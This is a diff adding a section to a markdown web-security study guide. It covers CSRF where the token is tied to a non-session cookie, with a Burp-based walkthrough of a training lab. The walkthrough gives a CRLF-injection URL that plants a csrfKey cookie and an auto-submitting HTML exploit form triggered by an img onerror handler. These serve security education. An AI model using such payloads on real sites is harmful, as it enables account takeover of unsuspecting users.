@@ -378,4 +378,125 @@ Click "Store" and then "Deliver to victim" to solve the lab.
 
 > NOTE: Check out [walkthrough](csrf_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+### CSRF token is tied to a non-session cookie
 
+A variation of the previous flaw occurs, when the application links the CSRF token to a cookie, but not the one actually used for session tracking. This often happens when different frameworks are used for managing sessions and CSRF protection, and they don't work together seamlessly.
+
+For example, an application might assign one cookie for session identification and another separate cookie for CSRF validation. If these are not properly linked, an attacker could potentially exploit the disconnect. Here's a typical request that demonstrates this setup:
+
+```
+POST /email/change HTTP/1.1  
+Host: vulnerable-website.com  
+Content-Type: application/x-www-form-urlencoded  
+Content-Length: 68  
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+```
+
+In this situation, even if the token is validated against a cookie, the lack of connection to the session cookie can render the defense ineffective. 
+
+### CSRF token is tied to a non-session cookie - Continued
+
+This scenario is more challenging to exploit, but the vulnerability still exists. If the target website has any functionality that enables an attacker to set a cookie in the victim's browser, a CSRF attack can still be carried out.
+
+In practice, the attacker would log into the vulnerable application using their own account, retrieve a valid CSRF token and its corresponding cookie, and then use the available cookie-setting feature to inject their own cookie into the victim's browser. After that, they deliver a CSRF payload that includes the attacker's token, which will now be accepted by the server due to the matching cookie.
+
+> NOTE: The functionality used to set the cookie doesn't have to reside in the same application that has the CSRF flaw. Any application on the same parent domain can potentially be abused to set cookies that apply to the target app. For instance, a cookie-setting endpoint on `stating.demo.normal-website.com` could be used to inject a cookie that is valid for `secure.normal-website.com`, as long as the cookie's domain and path attributes are appropriately scoped.
+
+### Lab: CSRF where token is tied to non-session cookie
+
+Open Burp's browser and log in with credentials `wiener:peter`. Submit the "Update email" form an find the resulting request in __Proxy__ > __History__. 
+
+Right-click the request and select __Send to Repeater__. If you change the `session` cookie, you will be logged out.
+
+_Response:_
+
+```
+HTTP/2 302 Found
+Location: /login
+Set-Cookie: session=[[...session_cookie...]]; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+But if you change the `csrfKey` cookie, the CSRF token will be rejected. 
+
+_Response:_
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+"Invalid CSRF token"
+```
+
+This suggests, that csrfKey cookie may not be strictly tied to the session. 
+
+> NOTE: Before proceeding, __save__ the value for `csrfKey` cookie and `csrf` parameter from the request body somewhere. Disregard `session` cookie.
+
+In Burp's browser, open a private incognito window and log in with credentials `carlos:montoya`. "Update email" once again and send the request from __Proxy__ > __History__ to Burp __Repeater__. 
+
+Now copy `csrfKey` cookie value and `csrf` request body parameter from `POST /my-account/update-email` request made by `wiener` and paste them in place of the same values in a request made by `carlos`. After sending the request, you can see that it's accepted. 
+
+_Response:_
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=carlos
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+Close the __Repeater__ tab and incognito browser. Back in the original browser (logged in as `wiener`), perform a search, send the resulting request to Burp Repeater and observe that the search term gets reflected in the `Set-Cookie` header. 
+
+_Response:_
+
+```
+HTTP/2 200 OK
+Set-Cookie: LastSearchTerm=search; Secure; HttpOnly
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3422
+```
+
+Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser. Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
+```
+
+`%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `\r\n` in ASCII. 
+`%3b` --- is __semicolon__ or `;`.
+`%20` --- is a __whitespace__.
+
+_Decoded URL:_
+
+```
+/?search=test
+Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
+```
+
+Now let's borrow an HTML template from one of the above labs, include both email and CSRF token inputs, but __DO NOT__ include the `<script>document.forms[0].submit();</script>`. Instead replace it with:
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="obscure@email.com">
+    <input type="hidden" name="csrf" value="[[...token...]">
+</form>
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
+
+This will perform a search, inject our `csrfKey` cookie through search request and submit this `/change-email` form with given properties (`email` and `csrf`). 
+
+Now turn on __intercept__ in Burp Proxy and perform an "Update email" request. Save `csrfKey` cookie value and `csrf` parameter value from request body and drop this request.
+
+Use these in the HTML template above and also add an email you haven't used before. 
+
+Click "Go to exploit server" and paste the resulting HTML into the "Body" section of the form. Click "Store".
+
+Click "Deliver exploit to victim" to solve the lab. 
+
+> NOTE: Check out [walkthrough](csrf_lab05_zaproxy.md) of this lab in OWASP Zed Attack Proxy
